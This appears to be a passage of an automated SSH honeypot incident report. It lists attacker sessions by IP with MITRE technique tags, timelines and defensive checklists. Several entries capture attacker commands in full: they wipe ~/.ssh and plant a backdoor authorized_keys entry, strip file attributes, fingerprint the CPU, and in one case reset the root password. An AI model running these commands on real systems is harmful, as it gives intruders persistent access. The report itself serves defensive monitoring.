| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:09:51` | `cowrie.session.connect` |
| `2026-06-08 09:09:51` | `cowrie.client.version` |
| `2026-06-08 09:09:51` | `cowrie.client.kex` |
| `2026-06-08 09:09:52` | `cowrie.login.success` |
| `2026-06-08 09:09:52` | `cowrie.session.params` |
| `2026-06-08 09:09:52` | `cowrie.command.input` |
| `2026-06-08 09:09:52` | `cowrie.command.failed` |
| `2026-06-08 09:09:53` | `cowrie.log.closed` |
| `2026-06-08 09:09:53` | `cowrie.session.params` |
| `2026-06-08 09:09:53` | `cowrie.command.input` |
| `2026-06-08 09:09:53` | `cowrie.session.file_download` |
| `2026-06-08 09:09:53` | `cowrie.log.closed` |
| `2026-06-08 09:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac628f53bf87

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:09 |
| **Last Seen** | 2026-06-08 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:09:55` | `cowrie.session.connect` |
| `2026-06-08 09:09:55` | `cowrie.client.version` |
| `2026-06-08 09:09:56` | `cowrie.client.kex` |
| `2026-06-08 09:09:56` | `cowrie.login.success` |
| `2026-06-08 09:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-558ccc94249f

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:11 |
| **Last Seen** | 2026-06-08 09:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:11:55` | `cowrie.session.connect` |
| `2026-06-08 09:11:55` | `cowrie.client.version` |
| `2026-06-08 09:11:55` | `cowrie.client.kex` |
| `2026-06-08 09:11:55` | `cowrie.login.success` |
| `2026-06-08 09:11:56` | `cowrie.session.params` |
| `2026-06-08 09:11:56` | `cowrie.command.input` |
| `2026-06-08 09:11:56` | `cowrie.command.failed` |
| `2026-06-08 09:11:56` | `cowrie.log.closed` |
| `2026-06-08 09:11:56` | `cowrie.session.params` |
| `2026-06-08 09:11:56` | `cowrie.command.input` |
| `2026-06-08 09:11:57` | `cowrie.session.file_download` |
| `2026-06-08 09:11:57` | `cowrie.log.closed` |
| `2026-06-08 09:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66007792393f

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:11 |
| **Last Seen** | 2026-06-08 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:11:59` | `cowrie.session.connect` |
| `2026-06-08 09:11:59` | `cowrie.client.version` |
| `2026-06-08 09:11:59` | `cowrie.client.kex` |
| `2026-06-08 09:12:00` | `cowrie.login.success` |
| `2026-06-08 09:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8c06cf7465

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 09:12 |
| **Last Seen** | 2026-06-08 09:13 |
| **Session Duration** | 74s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:PHLe8mFUXfnL"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:12:13` | `cowrie.session.connect` |
| `2026-06-08 09:12:13` | `cowrie.client.version` |
| `2026-06-08 09:12:16` | `cowrie.client.kex` |
| `2026-06-08 09:12:19` | `cowrie.login.success` |
| `2026-06-08 09:12:20` | `cowrie.session.params` |
| `2026-06-08 09:12:20` | `cowrie.command.input` |
| `2026-06-08 09:12:20` | `cowrie.command.failed` |
| `2026-06-08 09:12:26` | `cowrie.log.closed` |
| `2026-06-08 09:12:29` | `cowrie.session.params` |
| `2026-06-08 09:12:29` | `cowrie.command.input` |
| `2026-06-08 09:12:31` | `cowrie.session.file_download` |
| `2026-06-08 09:12:31` | `cowrie.log.closed` |
| `2026-06-08 09:12:47` | `cowrie.session.params` |
| `2026-06-08 09:12:47` | `cowrie.command.input` |
| `2026-06-08 09:12:52` | `cowrie.log.closed` |
| `2026-06-08 09:13:26` | `cowrie.session.params` |
| `2026-06-08 09:13:26` | `cowrie.command.input` |
| `2026-06-08 09:13:27` | `cowrie.log.closed` |
| `2026-06-08 09:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe19ac39043

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:16 |
| **Last Seen** | 2026-06-08 09:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:16:01` | `cowrie.session.connect` |
| `2026-06-08 09:16:01` | `cowrie.client.version` |
| `2026-06-08 09:16:02` | `cowrie.client.kex` |
| `2026-06-08 09:16:03` | `cowrie.login.success` |
| `2026-06-08 09:16:04` | `cowrie.session.params` |
| `2026-06-08 09:16:04` | `cowrie.command.input` |
| `2026-06-08 09:16:04` | `cowrie.command.failed` |
| `2026-06-08 09:16:04` | `cowrie.log.closed` |
| `2026-06-08 09:16:04` | `cowrie.session.params` |
| `2026-06-08 09:16:04` | `cowrie.command.input` |
| `2026-06-08 09:16:05` | `cowrie.session.file_download` |
| `2026-06-08 09:16:05` | `cowrie.log.closed` |
| `2026-06-08 09:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd75e4af1ddb

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:16 |
| **Last Seen** | 2026-06-08 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:16:08` | `cowrie.session.connect` |
| `2026-06-08 09:16:08` | `cowrie.client.version` |
| `2026-06-08 09:16:08` | `cowrie.client.kex` |
| `2026-06-08 09:16:09` | `cowrie.login.success` |
| `2026-06-08 09:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f86f501b58e

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:18 |
| **Last Seen** | 2026-06-08 09:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:18:04` | `cowrie.session.connect` |
| `2026-06-08 09:18:04` | `cowrie.client.version` |
| `2026-06-08 09:18:04` | `cowrie.client.kex` |
| `2026-06-08 09:18:04` | `cowrie.login.success` |
| `2026-06-08 09:18:05` | `cowrie.session.params` |
| `2026-06-08 09:18:05` | `cowrie.command.input` |
| `2026-06-08 09:18:05` | `cowrie.command.failed` |
| `2026-06-08 09:18:05` | `cowrie.log.closed` |
| `2026-06-08 09:18:05` | `cowrie.session.params` |
| `2026-06-08 09:18:05` | `cowrie.command.input` |
| `2026-06-08 09:18:06` | `cowrie.session.file_download` |
| `2026-06-08 09:18:06` | `cowrie.log.closed` |
| `2026-06-08 09:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39a45706773

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:18 |
| **Last Seen** | 2026-06-08 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:18:08` | `cowrie.session.connect` |
| `2026-06-08 09:18:08` | `cowrie.client.version` |
| `2026-06-08 09:18:08` | `cowrie.client.kex` |
| `2026-06-08 09:18:09` | `cowrie.login.success` |
| `2026-06-08 09:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991af4ca8383

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:20 |
| **Last Seen** | 2026-06-08 09:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:20:05` | `cowrie.session.connect` |
| `2026-06-08 09:20:05` | `cowrie.client.version` |
| `2026-06-08 09:20:06` | `cowrie.client.kex` |
| `2026-06-08 09:20:06` | `cowrie.login.success` |
| `2026-06-08 09:20:07` | `cowrie.session.params` |
| `2026-06-08 09:20:07` | `cowrie.command.input` |
| `2026-06-08 09:20:07` | `cowrie.command.failed` |
| `2026-06-08 09:20:07` | `cowrie.log.closed` |
| `2026-06-08 09:20:07` | `cowrie.session.params` |
| `2026-06-08 09:20:07` | `cowrie.command.input` |
| `2026-06-08 09:20:07` | `cowrie.session.file_download` |
| `2026-06-08 09:20:07` | `cowrie.log.closed` |
| `2026-06-08 09:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b196c3eaa0

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:20 |
| **Last Seen** | 2026-06-08 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:20:10` | `cowrie.session.connect` |
| `2026-06-08 09:20:10` | `cowrie.client.version` |
| `2026-06-08 09:20:10` | `cowrie.client.kex` |
| `2026-06-08 09:20:11` | `cowrie.login.success` |
| `2026-06-08 09:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d325cbb23a7

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:24 |
| **Last Seen** | 2026-06-08 09:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:24:25` | `cowrie.session.connect` |
| `2026-06-08 09:24:25` | `cowrie.client.version` |
| `2026-06-08 09:24:25` | `cowrie.client.kex` |
| `2026-06-08 09:24:26` | `cowrie.login.success` |
| `2026-06-08 09:24:26` | `cowrie.session.params` |
| `2026-06-08 09:24:26` | `cowrie.command.input` |
| `2026-06-08 09:24:26` | `cowrie.command.failed` |
| `2026-06-08 09:24:27` | `cowrie.log.closed` |
| `2026-06-08 09:24:28` | `cowrie.session.params` |
| `2026-06-08 09:24:28` | `cowrie.command.input` |
| `2026-06-08 09:24:28` | `cowrie.session.file_download` |
| `2026-06-08 09:24:28` | `cowrie.log.closed` |
| `2026-06-08 09:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a50aed8a43a0

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:24 |
| **Last Seen** | 2026-06-08 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:24:31` | `cowrie.session.connect` |
| `2026-06-08 09:24:31` | `cowrie.client.version` |
| `2026-06-08 09:24:31` | `cowrie.client.kex` |
| `2026-06-08 09:24:32` | `cowrie.login.success` |
| `2026-06-08 09:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e6a9ee3c78c

| Field | Detail |
|---|---|
| **Source IP** | `8.219.190[.]201` |
| **First Seen** | 2026-06-08 09:38 |
| **Last Seen** | 2026-06-08 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:38:06` | `cowrie.session.connect` |
| `2026-06-08 09:38:07` | `cowrie.client.version` |
| `2026-06-08 09:38:07` | `cowrie.client.kex` |
| `2026-06-08 09:38:08` | `cowrie.login.success` |
| `2026-06-08 09:38:08` | `cowrie.session.params` |
| `2026-06-08 09:38:08` | `cowrie.command.input` |
| `2026-06-08 09:38:08` | `cowrie.log.closed` |
| `2026-06-08 09:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.190[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.219.190[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28339a0aa38

| Field | Detail |
|---|---|
| **Source IP** | `8.219.190[.]201` |
| **First Seen** | 2026-06-08 09:38 |
| **Last Seen** | 2026-06-08 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:38:31` | `cowrie.session.connect` |
| `2026-06-08 09:38:31` | `cowrie.client.version` |
| `2026-06-08 09:38:31` | `cowrie.client.kex` |
| `2026-06-08 09:38:33` | `cowrie.login.success` |
| `2026-06-08 09:38:33` | `cowrie.session.params` |
| `2026-06-08 09:38:33` | `cowrie.command.input` |
| `2026-06-08 09:38:33` | `cowrie.log.closed` |
| `2026-06-08 09:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.190[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.219.190[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bca565e4b67

| Field | Detail |
|---|---|
| **Source IP** | `8.219.190[.]201` |
| **First Seen** | 2026-06-08 09:38 |
| **Last Seen** | 2026-06-08 09:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:38:34` | `cowrie.session.connect` |
| `2026-06-08 09:38:34` | `cowrie.client.version` |
| `2026-06-08 09:38:34` | `cowrie.client.kex` |
| `2026-06-08 09:38:36` | `cowrie.login.success` |
| `2026-06-08 09:38:36` | `cowrie.session.params` |
| `2026-06-08 09:38:36` | `cowrie.command.input` |
| `2026-06-08 09:38:36` | `cowrie.log.closed` |
| `2026-06-08 09:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.190[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.219.190[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f198d111b35

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 09:53 |
| **Last Seen** | 2026-06-08 09:55 |
| **Session Duration** | 109s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, ls -lh $(which ls), which ls` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:53:11` | `cowrie.session.connect` |
| `2026-06-08 09:53:11` | `cowrie.client.version` |
| `2026-06-08 09:53:13` | `cowrie.client.kex` |
| `2026-06-08 09:53:15` | `cowrie.login.success` |
| `2026-06-08 09:53:26` | `cowrie.session.params` |
| `2026-06-08 09:53:26` | `cowrie.command.input` |
| `2026-06-08 09:53:35` | `cowrie.session.file_download` |
| `2026-06-08 09:53:35` | `cowrie.log.closed` |
| `2026-06-08 09:53:49` | `cowrie.session.params` |
| `2026-06-08 09:53:49` | `cowrie.command.input` |
| `2026-06-08 09:54:28` | `cowrie.log.closed` |
| `2026-06-08 09:55:00` | `cowrie.session.params` |
| `2026-06-08 09:55:00` | `cowrie.command.input` |
| `2026-06-08 09:55:00` | `cowrie.command.input` |
| `2026-06-08 09:55:01` | `cowrie.log.closed` |
| `2026-06-08 09:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e2e00ef210

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-06-08 10:17 |
| **Last Seen** | 2026-06-08 10:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
